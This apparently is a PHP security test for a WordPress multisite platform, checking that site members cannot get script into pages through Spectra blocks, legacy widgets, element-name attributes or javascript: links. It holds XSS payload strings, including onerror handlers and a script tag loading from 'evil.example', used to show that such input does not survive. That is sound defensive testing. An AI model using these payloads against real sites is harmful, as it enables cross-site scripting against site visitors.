<?php
/**
 * Tests the isolation group of the security pass (2026-11-12,
 * tickets/M5-01-hardening-launch.md): what a member, the administrator of
 * their own site, can no longer do beyond it.
 *
 * Run from the repository root, on a member site:
 *
 *   docker exec -i -u www-data mody_cloud_app \
 *     wp --path=/var/www/html/wp --url=https://alpha.mody.local eval-file - < scripts/security-isolation-test.php
 *
 * (On the main site only the "main site unchanged" checks run.)
 *
 * 1. Script on a member's site: Spectra's Block JS is off, whatever carries it
 *    (a block, a widget block, a signed legacy-widget instance); `core/legacy-widget`
 *    and the widget routes are gone for members; content a member saves loses
 *    `spectraCustomJS` (over HTTP, a real save, even when Spectra would have kept it).
 *    Every attribute Spectra prints as an element's name (the container's htmlTag, the
 *    accordion title's tagName, the accordion header's headerElement) holds only a safe
 *    element, when saved by a member and when rendered, nested in the blocks around it.
 * 2. Application Passwords: the screen that creates one opens on the main site only.
 * 3. Deleting a site: refused for members, with a kind message.
 * 4. The quota counts owned sites: the owner is recorded by the pipeline, a role
 *    given or taken away changes nothing, older sites are filled in.
 * 5. The database export drops invitation keys.
 * 6. The export cooldown.
 * 7. The administration email: three changes a day, a short title.
 * 8. Invitations: twenty a day, the same answer for every address.
 * 9. Pictures: a header that says too many pixels is refused, before any decoding;
 *    Imagick refuses what no header says (a 400 MP bomb) and still opens a 48 MP photo.
 *
 * The users, sites, jobs and pages made here are removed at the end. Emails are
 * captured, not sent. No model call.
 */

use Mody\Platform\Dashboard\ExportPanel;
use Mody\Platform\Export\DatabaseDump;
use Mody\Platform\Export\Exporter;
use Mody\Platform\Export\Jobs as ExportJobs;
use Mody\Platform\Gating\ImageLimits;
use Mody\Platform\Gating\Isolation;
use Mody\Platform\Gating\MemberMail;
use Mody\Platform\Gating\MemberSite;
use Mody\Platform\Gating\Throttle;
use Mody\Platform\Media\ImageSize;
use Mody\Platform\Provisioning\Jobs as ProvisioningJobs;
use Mody\Platform\Provisioning\Pipeline;
use Mody\Platform\Provisioning\Quota;
use Mody\Platform\Spectra\SpectraGuard;
use Mody\Platform\Users\Avatars;
use Mody\Platform\Wizard\WizardController;

require_once ABSPATH . 'wp-admin/includes/ms.php';
require_once ABSPATH . 'wp-admin/includes/misc.php';

$failures = 0;
$check    = static function ( string $label, bool $ok, string $detail = '' ) use ( &$failures ): void {
	$failures += $ok ? 0 : 1;
	printf( "%-4s %-60s %s\n", $ok ? 'ok' : 'FAIL', $label, $detail );
};

global $wpdb;
$main      = get_main_site_id();
$on_member = ! is_main_site();
$here      = get_current_blog_id();
$admins    = get_super_admins();
$super     = get_user_by( 'login', $admins[0] )->ID;
$suffix    = strtolower( wp_generate_password( 6, false ) );
$bs        = chr( 92 ); // A backslash (a \uXXXX typed in a tool call would arrive decoded).

// Everything made here goes at the end.
$made = array(
	'users' => array(),
	'sites' => array(),
	'jobs'  => array(),
	'posts' => array(), // site => [ids].
	'files' => array(),
);
$new_user = static function ( string $login ) use ( $suffix, &$made ): int {
	$id            = (int) wp_insert_user(
		array(
			'user_login' => $login . $suffix,
			'user_email' => $login . $suffix . '@mody.local',
			'user_pass'  => wp_generate_password( 24 ),
			'role'       => '',
		)
	);
	$made['users'][] = $id;
	// wp_insert_user() with an empty role still gives the user an (empty) membership of the site it ran on.
	delete_user_meta( $id, $GLOBALS['wpdb']->get_blog_prefix() . 'capabilities' );
	return $id;
};
register_shutdown_function(
	static function () use ( &$made, $wpdb ): void {
		foreach ( $made['posts'] as $site_id => $ids ) {
			switch_to_blog( (int) $site_id );
			foreach ( $ids as $id ) {
				wp_delete_post( (int) $id, true );
			}
			restore_current_blog();
		}
		foreach ( $made['jobs'] as $job_id ) {
			$wpdb->delete( ProvisioningJobs::table(), array( 'id' => $job_id ) ); // phpcs:ignore WordPress.DB.DirectDatabaseQuery
		}
		foreach ( $made['sites'] as $site_id ) {
			$wpdb->delete( ExportJobs::table(), array( 'site_id' => $site_id ) ); // phpcs:ignore WordPress.DB.DirectDatabaseQuery
			if ( get_site( (int) $site_id ) ) {
				wp_delete_site( (int) $site_id );
			}
		}
		foreach ( $made['users'] as $user_id ) {
			wpmu_delete_user( (int) $user_id );
		}
		foreach ( $made['files'] as $file ) {
			if ( is_file( $file ) ) {
				wp_delete_file( $file );
			} elseif ( is_dir( $file ) ) {
				rmdir( $file ); // phpcs:ignore WordPress.WP.AlternativeFunctions.file_system_operations_rmdir -- Empty temp folder.
			}
		}
	}
);

// Emails, captured instead of sent.
$mails = array();
add_filter(
	'pre_wp_mail',
	static function ( $preempt, $atts ) use ( &$mails ) {
		$mails[] = $atts;
		return true;
	},
	10,
	2
);

// A member's login, for the requests over HTTP: cookies, and the nonces that go with them.
$http_ready = false;
$host_of    = static fn( int $site_id ): string => (string) get_site( $site_id )->domain;
$cookie     = static function ( int $user_id ): array {
	$expiration = time() + 600;
	$token      = WP_Session_Tokens::get_instance( $user_id )->create( $expiration );
	register_shutdown_function( static fn() => WP_Session_Tokens::get_instance( $user_id )->destroy( $token ) );
	return array(
		SECURE_AUTH_COOKIE => wp_generate_auth_cookie( $user_id, $expiration, 'secure_auth', $token ),
		LOGGED_IN_COOKIE   => wp_generate_auth_cookie( $user_id, $expiration, 'logged_in', $token ),
	);
};
// A nonce the way that user's browser would hold it (it depends on the login cookie's session).
$nonce = static function ( int $user_id, array $cookies, string $action ): string {
	$previous                   = $_COOKIE[ LOGGED_IN_COOKIE ] ?? null;
	$_COOKIE[ LOGGED_IN_COOKIE ] = $cookies[ LOGGED_IN_COOKIE ];
	$before                     = get_current_user_id();
	wp_set_current_user( $user_id );
	$value = wp_create_nonce( $action );
	wp_set_current_user( $before );
	if ( null === $previous ) {
		unset( $_COOKIE[ LOGGED_IN_COOKIE ] );
	} else {
		$_COOKIE[ LOGGED_IN_COOKIE ] = $previous;
	}
	return $value;
};
// This container reaches only the main host; the Host header picks the site.
$http = static function ( string $method, string $host, string $path, array $cookies = array(), array $headers = array(), $body = null ): array {
	$response = wp_remote_request(
		'https://' . get_site( get_main_site_id() )->domain . $path,
		array(
			'method'      => $method,
			'cookies'     => $cookies,
			'headers'     => array_merge( array( 'Host' => $host ), $headers ),
			'body'        => $body,
			'sslverify'   => false,
			'redirection' => 0,
			'timeout'     => 60,
		)
	);
	return array(
		'code'     => (int) wp_remote_retrieve_response_code( $response ),
		'location' => (string) wp_remote_retrieve_header( $response, 'location' ),
		'body'     => (string) wp_remote_retrieve_body( $response ),
	);
};
$rest_json = static function ( string $method, string $host, string $route, array $data, int $user_id, array $cookies ) use ( $http, $nonce ): array {
	$out         = $http(
		$method,
		$host,
		'/wp-json' . $route,
		$cookies,
		array(
			'Content-Type' => 'application/json',
			'X-WP-Nonce'   => $nonce( $user_id, $cookies, 'wp_rest' ),
		),
		wp_json_encode( $data )
	);
	$out['json'] = json_decode( $out['body'], true );
	return $out;
};

$js_block = '<!-- wp:paragraph {"spectraCustomJS":"window.__isolation_probe=document.domain"} --><p>probe paragraph</p><!-- /wp:paragraph -->';

// 0. Fixtures: a member (not a super admin) who administers the current member site -------------------------

$member   = $new_user( 'modyiso' );
$stranger = $new_user( 'modyiso2' ); // An account that is on no site.
$site     = $here;
if ( $on_member ) {
	add_user_to_blog( $site, $member, 'administrator' );
}

// 1. Script on a member's site ------------------------------------------------------------------------

echo "\nBlock script\n";
$js_class = 'SpectraBlocks\\Extensions\\BlockJsCompiler';
if ( $on_member && class_exists( $js_class ) ) {
	$compiler = $js_class::instance();
	$check( 'Spectra\'s Block JS is not hooked on a member site', false === has_filter( 'render_block', array( $compiler, 'harvest_block_js' ) ) && false === has_action( 'wp_footer', array( $compiler, 'output_block_js' ) ) );
	$check( 'core/legacy-widget is not a block of a member site', ! WP_Block_Type_Registry::get_instance()->is_registered( 'core/legacy-widget' ) );

	// The render-time strip alone: put Spectra's hooks back, and render a block that carries script.
	remove_action( 'wp_footer', 'the_block_template_skip_link' ); // Deprecated in core, and noise here.
	$compiler->init();
	$rendered = do_blocks( $js_block );
	ob_start();
	do_action( 'wp_footer' );
	$footer = ob_get_clean();
	$check( 'a block with spectraCustomJS renders, and no script is printed (hooks back on)', str_contains( $rendered, 'probe paragraph' ) && ! str_contains( $footer, 'spectra-block-js' ) && ! str_contains( $footer, '__isolation_probe' ), 'footer ' . strlen( $footer ) . ' bytes' );
	$nested = do_blocks( '<!-- wp:group {"layout":{"type":"constrained"}} --><div class="wp-block-group">' . $js_block . '</div><!-- /wp:group -->' );
	ob_start();
	do_action( 'wp_footer' );
	$footer = ob_get_clean();
	$check( '... nor when it is inside another block', str_contains( $nested, 'probe paragraph' ) && ! str_contains( $footer, '__isolation_probe' ) );
	SpectraGuard::remove_block_js();
	$check( '... and remove_block_js() takes the hooks off again', false === has_filter( 'render_block', array( $compiler, 'harvest_block_js' ) ) && false === has_action( 'wp_footer', array( $compiler, 'output_block_js' ) ) );

	// A signed legacy-widget instance holding the script: the original way past the save-time check.
	wp_set_current_user( $super );
	$encode = new WP_REST_Request( 'POST', '/wp/v2/widget-types/block/encode' );
	$encode->set_param( 'form_data', 'widget-block[1][content]=' . rawurlencode( $js_block ) );
	$encoded = rest_do_request( $encode );
	wp_set_current_user( 0 );
	$instance = $encoded->get_status() === 200 ? ( (array) $encoded->get_data() )['instance'] ?? null : null;
	$check( 'control: a super admin can still make a widget instance', is_array( $instance ) && ! empty( $instance['encoded'] ) && ! empty( $instance['hash'] ), 'status ' . $encoded->get_status() );
	$legacy = serialize_block(
		array(
			'blockName'    => 'core/legacy-widget',
			'attrs'        => array(
				'idBase'   => 'block',
				'instance' => array(
					'encoded' => $instance['encoded'] ?? '',
					'hash'    => $instance['hash'] ?? '',
				),
			),
			'innerBlocks'  => array(),
			'innerHTML'    => '',
			'innerContent' => array(),
		)
	);
	$out    = do_blocks( $legacy );
	ob_start();
	do_action( 'wp_footer' );
	$footer = ob_get_clean();
	$check( 'a stored legacy-widget block renders nothing on a member site', '' === trim( $out ) && ! str_contains( $out, 'probe paragraph' ) && ! str_contains( $footer, '__isolation_probe' ), strlen( $out ) . ' bytes' );

	// The widget routes.
	wp_set_current_user( $member );
	$routes = array(
		array( 'POST', '/wp/v2/widget-types/block/encode' ),
		array( 'POST', '/wp/v2/widget-types/block/render' ),
		array( 'POST', '/wp/v2/widget-types/Block/ENCODE' ),
		array( 'GET', '/wp/v2/widgets' ),
		array( 'POST', '/wp/v2/widgets' ),
	);
	$codes  = array();
	foreach ( $routes as $route ) {
		$codes[] = $route[0] . ' ' . $route[1] . ' ' . rest_do_request( new WP_REST_Request( $route[0], $route[1] ) )->get_status();
	}
	wp_set_current_user( $super );
	$super_widgets = rest_do_request( new WP_REST_Request( 'GET', '/wp/v2/widgets' ) )->get_status();
	wp_set_current_user( 0 );
	$check( 'a member gets no widget route (encode, render, widgets)', 5 === count( preg_grep( '/ 403$/', $codes ) ), implode( '; ', $codes ) );
	$check( '... a super admin does', 200 === $super_widgets, (string) $super_widgets );
} elseif ( $on_member ) {
	$check( 'Spectra is loaded', false );
}

// Every Spectra block with every string attribute set to a handler payload (found 2026-11-12: the container's htmlTag is printed as the element's name).
if ( $on_member ) {
	$scan = static function ( string $html ): array {
		$found = array();
		$p     = new WP_HTML_Tag_Processor( $html );
		while ( $p->next_tag() ) {
			foreach ( (array) $p->get_attribute_names_with_prefix( 'on' ) as $attribute ) {
				$found[] = '<' . $p->get_tag() . ' ' . $attribute;
			}
			foreach ( array( 'href', 'src', 'action', 'formaction' ) as $attribute ) {
				$value = $p->get_attribute( $attribute );
				if ( is_string( $value ) && preg_match( '/^\s*javascript:/i', $value ) ) {
					$found[] = '<' . $p->get_tag() . ' ' . $attribute . '=javascript:';
				}
			}
			if ( 'SCRIPT' === $p->get_tag() ) {
				$found[] = '<script>';
			}
		}
		return $found;
	};
	$fill = static function ( $value, string $payload ) use ( &$fill ) {
		if ( is_string( $value ) ) {
			return $payload;
		}
		return is_array( $value ) ? array_map( static fn( $v ) => $fill( $v, $payload ), $value ) : $value;
	};
	$payloads = array( 'img src=x onerror=window.__fz=1', 'x" onmouseover="window.__fz=2" y="', 'svg onload=window.__fz=3', 'x/onclick=window.__fz=4 tabindex=0 onfocus=window.__fz=5', 'javascript:window.__fz=6', '"><script>window.__fz=7</script>' );
	$pairs    = 0;
	$leaks    = array();
	foreach ( (array) glob( WPMU_PLUGIN_DIR . '/spectra-blocks/build/blocks/*/block.json' ) as $json_file ) {
		$json = json_decode( (string) file_get_contents( $json_file ), true ); // phpcs:ignore WordPress.WP.AlternativeFunctions.file_get_contents_file_get_contents
		$name = (string) ( $json['name'] ?? '' );
		if ( '' === $name || ! WP_Block_Type_Registry::get_instance()->is_registered( $name ) ) {
			continue;
		}
		foreach ( $payloads as $payload ) {
			$attrs = array();
			foreach ( (array) ( $json['attributes'] ?? array() ) as $attribute => $definition ) {
				if ( 'string' === ( $definition['type'] ?? '' ) ) {
					$attrs[ $attribute ] = $payload;
				} elseif ( isset( $definition['default'] ) && is_array( $definition['default'] ) ) {
					$attrs[ $attribute ] = $fill( $definition['default'], $payload );
				}
			}
			unset( $attrs['spectraId'] );
			ob_start();
			$html = render_block( array( 'blockName' => $name, 'attrs' => $attrs, 'innerBlocks' => array(), 'innerHTML' => '<div></div>', 'innerContent' => array( '<div></div>' ) ) );
			ob_end_clean();
			++$pairs;
			$found = $scan( $html );
			if ( 'spectra/popup-builder' === $name ) {
				$found = array_diff( $found, array( '<script>' ) ); // The popup builder prints its own generated script; the payload is not in it (checked below).
				if ( preg_match( '#<script\b[^>]*>(.*?)</script>#is', $html, $script ) && str_contains( $script[1], '__fz' ) ) {
					$found[] = 'payload in the popup script';
				}
			}
			foreach ( $found as $leak ) {
				$leaks[] = $name . ': ' . $leak;
			}
		}
	}
	$check( 'every Spectra block, every string attribute a handler payload: no on* attribute, script or javascript: URL', $pairs > 150 && ! $leaks, $pairs . ' renders' . ( $leaks ? ', ' . implode( '; ', array_slice( array_unique( $leaks ), 0, 4 ) ) : '' ) );
	// The container's element: only the names Spectra offers.
	$tag_of = static function ( array $attrs ) use ( $scan ): string {
		$html = render_block( array( 'blockName' => 'spectra/container', 'attrs' => $attrs, 'innerBlocks' => array(), 'innerHTML' => '<div></div>', 'innerContent' => array( '<div></div>' ) ) );
		$p    = new WP_HTML_Tag_Processor( $html );
		return $p->next_tag() ? strtolower( $p->get_tag() ) : '';
	};
	$check( 'the container keeps a tag Spectra offers (section, nav, header)', 'section' === $tag_of( array( 'htmlTag' => 'section' ) ) && 'nav' === $tag_of( array( 'htmlTag' => 'nav' ) ) && 'header' === $tag_of( array( 'htmlTag' => 'header' ) ) );
	$check( '... and falls back to div for anything else, in any case or type', 'div' === $tag_of( array( 'htmlTag' => 'img src=x onerror=window.__fz=1' ) ) && 'div' === $tag_of( array( 'htmlTag' => 'SECTION' ) ) && 'div' === $tag_of( array( 'htmlTag' => array( 'x' ) ) ) && 'div' === $tag_of( array( 'htmlTag' => 'script' ) ) );
	$link = render_block( array( 'blockName' => 'spectra/container', 'attrs' => array( 'htmlTag' => 'a', 'linkURL' => 'javascript:window.__fz=1' ), 'innerBlocks' => array(), 'innerHTML' => '<div></div>', 'innerContent' => array( '<div></div>' ) ) );
	$check( 'a container that is a link never gets a javascript: address', ! $scan( $link ) && ! str_contains( $link, 'javascript:' ), substr( $link, 0, 80 ) );

	// Found by the review: the accordion's title prints its tagName as the element, and checks it only when its header is a button. A header that is a div (a valid value) turns that off.
	$parsed = static function ( string $name, array $attrs = array(), array $inner = array() ): array {
		return array(
			'blockName'    => $name,
			'attrs'        => $attrs,
			'innerBlocks'  => $inner,
			'innerHTML'    => '',
			'innerContent' => $inner ? array_fill( 0, count( $inner ), null ) : array(),
		);
	};
	$accordion = static function ( array $header_attrs, array $title_attrs ) use ( $parsed ): array {
		return $parsed(
			'spectra/accordion',
			array(),
			array(
				$parsed(
					'spectra/accordion-child-item',
					array(),
					array(
						$parsed(
							'spectra/accordion-child-header',
							$header_attrs,
							array( $parsed( 'spectra/accordion-child-header-content', $title_attrs + array( 'text' => 'Title text' ) ) )
						),
					)
				),
			)
		);
	};
	$elements_of = static function ( string $html ): array {
		$names = array();
		$p     = new WP_HTML_Tag_Processor( $html );
		while ( $p->next_tag() ) {
			$names[] = strtolower( (string) $p->get_tag() );
		}
		return $names;
	};
	$evil   = 'script src=https://evil.example/x.js';
	$html   = render_block( $accordion( array( 'headerElement' => 'div' ), array( 'tagName' => $evil ) ) );
	$check( 'the accordion title with a div header and tagName "script src=...": no script element', ! in_array( 'script', $elements_of( $html ), true ) && ! str_contains( $html, 'evil.example' ) && str_contains( $html, 'Title text' ), implode( ',', array_unique( $elements_of( $html ) ) ) );
	$html = render_block( $accordion( array( 'headerElement' => $evil ), array( 'tagName' => $evil ) ) );
	$check( '... nor when headerElement is the payload too (the header ignores it, its child reads it raw)', ! in_array( 'script', $elements_of( $html ), true ) && ! str_contains( $html, 'evil.example' ), implode( ',', array_unique( $elements_of( $html ) ) ) );
	$html = render_block( $accordion( array( 'headerElement' => 'h3' ), array( 'tagName' => 'h4' ) ) );
	$check( '... and a heading header with a heading title keeps both elements', in_array( 'h3', $elements_of( $html ), true ) && in_array( 'h4', $elements_of( $html ), true ) && str_contains( $html, 'Title text' ), implode( ',', array_unique( $elements_of( $html ) ) ) );
	$html = render_block( $accordion( array(), array( 'tagName' => 'h4' ) ) );
	$check( '... a button header forces a span (Spectra\'s own rule is untouched)', ! in_array( 'h4', $elements_of( $html ), true ) && in_array( 'button', $elements_of( $html ), true ), implode( ',', array_unique( $elements_of( $html ) ) ) );

	// Every attribute that looks like an element's name is in the map: a Spectra update that adds one fails here.
	$tag_like = array();
	$not_in   = array();
	foreach ( (array) glob( WPMU_PLUGIN_DIR . '/spectra-blocks/build/blocks/*/block.json' ) as $json_file ) {
		$json  = json_decode( (string) file_get_contents( $json_file ), true ); // phpcs:ignore WordPress.WP.AlternativeFunctions.file_get_contents_file_get_contents
		$name  = (string) ( $json['name'] ?? '' );
		$names = array_merge( array_keys( (array) ( $json['attributes'] ?? array() ) ), array_values( (array) ( $json['providesContext'] ?? array() ) ) );
		foreach ( $names as $attribute ) {
			if ( is_string( $attribute ) && preg_match( '/(tag|element)/i', $attribute ) ) {
				$tag_like[] = $name . ' ' . $attribute;
				if ( ! array_key_exists( $attribute, SpectraGuard::ELEMENT_DEFAULTS ) ) {
					$not_in[] = $name . ' ' . $attribute;
				}
			}
		}
	}
	$check( 'every Spectra attribute named like an element (tag, element) is one SpectraGuard clamps', count( $tag_like ) >= 5 && ! $not_in, count( $tag_like ) . ' found' . ( $not_in ? ', not covered: ' . implode( ', ', $not_in ) : '' ) );
	$wrong = array();
	foreach ( SpectraGuard::ELEMENT_ATTRIBUTES as $block_name => $attributes ) {
		$type = WP_Block_Type_Registry::get_instance()->get_registered( $block_name );
		foreach ( array_keys( $attributes ) as $attribute ) {
			if ( ! $type || ! isset( $type->attributes[ $attribute ] ) ) {
				$wrong[] = $block_name . ' ' . $attribute;
			}
		}
	}
	$check( '... and every block and attribute in SpectraGuard::ELEMENT_ATTRIBUTES exists in this Spectra', ! $wrong, implode( ', ', $wrong ) );

	// Every block inside the blocks it needs around it (its parent, and that block's parent), with a payload in every string attribute of the whole chain.
	$specs = array();
	foreach ( (array) glob( WPMU_PLUGIN_DIR . '/spectra-blocks/build/blocks/*/block.json' ) as $json_file ) {
		$json = json_decode( (string) file_get_contents( $json_file ), true ); // phpcs:ignore WordPress.WP.AlternativeFunctions.file_get_contents_file_get_contents
		if ( ! empty( $json['name'] ) ) {
			$specs[ (string) $json['name'] ] = $json;
		}
	}
	$chain_of = static function ( string $name ) use ( $specs ): array {
		$chain = array( $name );
		for ( $i = 0; $i < 6; $i++ ) {
			$above = $specs[ $chain[0] ]['parent'][0] ?? $specs[ $chain[0] ]['ancestor'][0] ?? '';
			if ( '' === $above || ! isset( $specs[ $above ] ) || in_array( $above, $chain, true ) ) {
				break;
			}
			array_unshift( $chain, $above );
		}
		return $chain;
	};
	$attrs_of = static function ( string $name, string $payload ) use ( $specs, $fill ): array {
		$attrs = array();
		foreach ( (array) ( $specs[ $name ]['attributes'] ?? array() ) as $attribute => $definition ) {
			if ( 'string' === ( $definition['type'] ?? '' ) ) {
				$attrs[ $attribute ] = $payload;
			} elseif ( isset( $definition['default'] ) && is_array( $definition['default'] ) ) {
				$attrs[ $attribute ] = $fill( $definition['default'], $payload );
			}
		}
		unset( $attrs['spectraId'] );
		return $attrs;
	};
	$nest = static function ( array $chain, string $payload, ?string $header_element ) use ( $parsed, $attrs_of ): array {
		$block = null;
		foreach ( array_reverse( $chain ) as $name ) {
			$attrs = $attrs_of( $name, $payload );
			if ( null !== $header_element && isset( $attrs['headerElement'] ) ) {
				$attrs['headerElement'] = $header_element;
			}
			$block = $parsed( $name, $attrs, $block ? array( $block ) : array() );
		}
		return $block;
	};
	$bad_elements = array( 'script', 'iframe', 'embed', 'object' );
	$chain_leaks  = array();
	$chain_pairs  = 0;
	foreach ( array_keys( $specs ) as $name ) {
		if ( ! WP_Block_Type_Registry::get_instance()->is_registered( $name ) ) {
			continue;
		}
		foreach ( array( $evil, 'iframe src=https://evil.example/x', 'img src=x onerror=window.__fz=1' ) as $payload ) {
			foreach ( array( null, 'div' ) as $header_element ) {
				ob_start();
				$html = render_block( $nest( $chain_of( $name ), $payload, $header_element ) );
				ob_end_clean();
				++$chain_pairs;
				$found = $scan( $html );
				foreach ( $elements_of( $html ) as $element ) {
					if ( in_array( $element, $bad_elements, true ) && ! ( 'script' === $element && 'spectra/popup-builder' === $name ) ) {
						$found[] = '<' . $element . '>';
					}
				}
				if ( 'spectra/popup-builder' === $name ) {
					$found = array_diff( $found, array( '<script>' ) );
					if ( preg_match( '#<script\b[^>]*>(.*?)</script>#is', $html, $script ) && str_contains( $script[1], 'evil.example' ) ) {
						$found[] = 'payload in the popup script';
					}
				}
				foreach ( $found as $leak ) {
					$chain_leaks[] = $name . ' (' . ( $header_element ?? 'raw' ) . '): ' . $leak;
				}
			}
		}
	}
	$check( 'every Spectra block inside its parents, a payload in every string attribute of all of them: no script, iframe, embed, object, handler or javascript:', $chain_pairs > 250 && ! $chain_leaks, $chain_pairs . ' renders' . ( $chain_leaks ? ', ' . implode( '; ', array_slice( array_unique( $chain_leaks ), 0, 4 ) ) : '' ) );
}

// The pure functions.
$stripped = SpectraGuard::strip_content_scripts( '<!-- wp:group --><div class="wp-block-group">' . $js_block . '</div><!-- /wp:group -->' );
$check( 'strip_content_scripts() removes the attribute from a nested block and keeps the rest', ! str_contains( $stripped, 'spectraCustomJS' ) && str_contains( $stripped, 'probe paragraph' ) && str_contains( $stripped, 'wp:group' ), $stripped );
$nested_save = '<!-- wp:spectra/accordion --><!-- wp:spectra/accordion-child-item --><!-- wp:spectra/accordion-child-header {"headerElement":"div"} --><!-- wp:spectra/accordion-child-header-content {"tagName":"script src=https://evil.example/x.js","text":"Hi"} /--><!-- /wp:spectra/accordion-child-header --><!-- /wp:spectra/accordion-child-item --><!-- /wp:spectra/accordion -->';
$cleaned     = SpectraGuard::strip_content_scripts( $nested_save );
$check( 'strip_content_scripts() drops the title\'s tagName "script src=..." in a nested block and keeps the allowed headerElement', ! str_contains( $cleaned, 'evil.example' ) && ! str_contains( $cleaned, 'tagName' ) && str_contains( $cleaned, '"headerElement":"div"' ) && str_contains( $cleaned, '"text":"Hi"' ), $cleaned );
$escaped_key = str_replace( 'tagName', $bs . 'u0074agName', $nested_save );
$check( '... also when the key is spelled with a \\u escape', ! str_contains( SpectraGuard::strip_content_scripts( $escaped_key ), 'evil.example' ), substr( SpectraGuard::strip_content_scripts( $escaped_key ), 0, 200 ) );
$fine = '<!-- wp:spectra/content {"tagName":"h2","text":"A"} /--><!-- wp:spectra/container {"htmlTag":"section"} --><!-- /wp:spectra/container --><!-- wp:spectra/accordion-child-header {"headerElement":"button"} --><!-- /wp:spectra/accordion-child-header -->';
$check( '... and content with only allowed names comes back byte for byte', $fine === SpectraGuard::strip_content_scripts( $fine ) );
$names = static fn( string $block, array $attrs ): array => SpectraGuard::clamp_elements( $block, $attrs )[0];
$check( 'clamp_elements(): the title keeps span, p, div, h1-h6, and drops anything else, in any case or type', array( 'tagName' => 'h3' ) === $names( 'spectra/accordion-child-header-content', array( 'tagName' => 'h3' ) ) && array() === $names( 'spectra/accordion-child-header-content', array( 'tagName' => 'a' ) ) && array() === $names( 'spectra/accordion-child-header-content', array( 'tagName' => 'H3' ) ) && array() === $names( 'spectra/accordion-child-header-content', array( 'tagName' => array( 'span' ) ) ) && array() === $names( 'spectra/accordion-child-header-content', array( 'tagName' => 'span ' ) ) );
$check( '... the header keeps button, div, headings and p, and drops the rest', array( 'headerElement' => 'p' ) === $names( 'spectra/accordion-child-header', array( 'headerElement' => 'p' ) ) && array() === $names( 'spectra/accordion-child-header', array( 'headerElement' => 'script' ) ) && array() === $names( 'spectra/accordion-child-header', array( 'headerElement' => 'span' ) ) );
$check( '... spectra/content keeps the elements Spectra\'s own list has (a, blockquote, pre), and drops script and iframe', array( 'tagName' => 'blockquote' ) === $names( 'spectra/content', array( 'tagName' => 'blockquote' ) ) && array( 'tagName' => 'a' ) === $names( 'spectra/content', array( 'tagName' => 'a' ) ) && array() === $names( 'spectra/content', array( 'tagName' => 'script' ) ) && array() === $names( 'spectra/content', array( 'tagName' => 'iframe src=x' ) ) );
$check( '... a Spectra block no one has listed gets the strict defaults, and a block of another plugin is left alone', array() === $names( 'spectra/future-block', array( 'tagName' => 'a' ) ) && array() === $names( 'spectra/future-block', array( 'headerElement' => 'h9' ) ) && array( 'tagName' => 'anything' ) === $names( 'other/block', array( 'tagName' => 'anything' ) ) && array() === $names( 'other/block', array( 'htmlTag' => 'script' ) ) );
$check( '... and other attributes are untouched', array( 'text' => 'x', 'anchor' => 'a b' ) === $names( 'spectra/accordion-child-header-content', array( 'text' => 'x', 'anchor' => 'a b' ) ) );
$escaped = '<!-- wp:paragraph {"' . $bs . 'u0073pectraCustomJS":"window.x=1"} --><p>esc</p><!-- /wp:paragraph -->';
$check( '... also when the key is spelled with a \\u escape', ! str_contains( SpectraGuard::strip_content_scripts( $escaped ), 'CustomJS' ) && ! str_contains( SpectraGuard::strip_content_scripts( $escaped ), 'u0073' ), SpectraGuard::strip_content_scripts( $escaped ) );
$plain = '<!-- wp:paragraph {"align":"center"} --><p class="has-text-align-center">plain</p><!-- /wp:paragraph -->';
$check( '... and returns content with none byte for byte', $plain === SpectraGuard::strip_content_scripts( $plain ) && 'no blocks' === SpectraGuard::strip_content_scripts( 'no blocks' ) );
$check( 'the widget and post save filters are hooked', false !== has_filter( 'wp_insert_post_data', array( SpectraGuard::class, 'strip_saved_scripts' ) ) && false !== has_filter( 'pre_update_option_widget_block', array( SpectraGuard::class, 'strip_widget_scripts' ) ) && false !== has_filter( 'render_block_data', array( SpectraGuard::class, 'strip_block_scripts' ) ) );
switch_to_blog( $main );
$kept = SpectraGuard::strip_block_scripts( array( 'blockName' => 'core/paragraph', 'attrs' => array( 'spectraCustomJS' => 'x' ) ) );
restore_current_blog();
$check( 'the main site is unchanged: render keeps what a super admin put there', 'x' === ( $kept['attrs']['spectraCustomJS'] ?? null ) );
if ( ! $on_member ) {
	$check( 'the main site keeps core/legacy-widget', WP_Block_Type_Registry::get_instance()->is_registered( 'core/legacy-widget' ) );
}

if ( $on_member ) {
	echo "\nBlock script, over HTTP (a real save, a real page view)\n";
	$host    = $host_of( $site );
	$cookies = $cookie( $member );
	$admin_c = $cookie( $super );
	$http_ready = true;

	// The control: Spectra's own gate sees this one as new.
	$out = $rest_json( 'POST', $host, '/wp/v2/pages', array( 'title' => 'Isolation direct', 'status' => 'publish', 'content' => $js_block ), $member, $cookies );
	$pid = (int) ( $out['json']['id'] ?? 0 );
	$made['posts'][ $site ][] = $pid;
	switch_to_blog( $site );
	$stored = (string) get_post_field( 'post_content', $pid );
	restore_current_blog();
	$check( 'a member saves a page with spectraCustomJS: it is not stored', 201 === $out['code'] && '' !== $stored && ! str_contains( $stored, 'spectraCustomJS' ) && str_contains( $stored, 'probe paragraph' ), $out['code'] . ' ' . substr( $stored, 0, 80 ) );

	// A snippet already stored (by the server) is carried by Spectra's own gate; this one drops it.
	switch_to_blog( $site );
	$carried = (int) wp_insert_post(
		array(
			'post_type'    => 'page',
			'post_status'  => 'publish',
			'post_title'   => 'Isolation carried',
			'post_content' => $js_block,
			'post_author'  => $member,
		)
	);
	$stored0 = (string) get_post_field( 'post_content', $carried );
	restore_current_blog();
	$made['posts'][ $site ][] = $carried;
	$check( 'control: the server (WP-CLI) may store it, which is how an old snippet gets there', str_contains( $stored0, 'spectraCustomJS' ) );
	$out = $rest_json( 'POST', $host, '/wp/v2/pages/' . $carried, array( 'title' => 'Isolation carried', 'content' => $js_block . '<!-- wp:paragraph --><p>edited</p><!-- /wp:paragraph -->' ), $member, $cookies );
	switch_to_blog( $site );
	clean_post_cache( $carried ); // This process cached the post when it made it; the edit was made by the web server.
	$stored = (string) get_post_field( 'post_content', $carried );
	restore_current_blog();
	$check( 'a member edits that page: the old snippet goes too (Spectra alone would have kept it)', 200 === $out['code'] && ! str_contains( $stored, 'spectraCustomJS' ) && str_contains( $stored, 'edited' ), $out['code'] . ' ' . substr( $stored, 0, 80 ) );

	// The page the original attack made: the script inside a signed legacy-widget instance, stored by the server for the test.
	if ( ! empty( $instance ) ) {
		switch_to_blog( $site );
		$trap = (int) wp_insert_post(
			array(
				'post_type'    => 'page',
				'post_status'  => 'publish',
				'post_title'   => 'Isolation trap',
				'post_content' => '<!-- wp:paragraph --><p>front page text</p><!-- /wp:paragraph -->' . $legacy,
				'post_author'  => $member,
			)
		);
		$url = get_permalink( $trap );
		restore_current_blog();
		$made['posts'][ $site ][] = $trap;
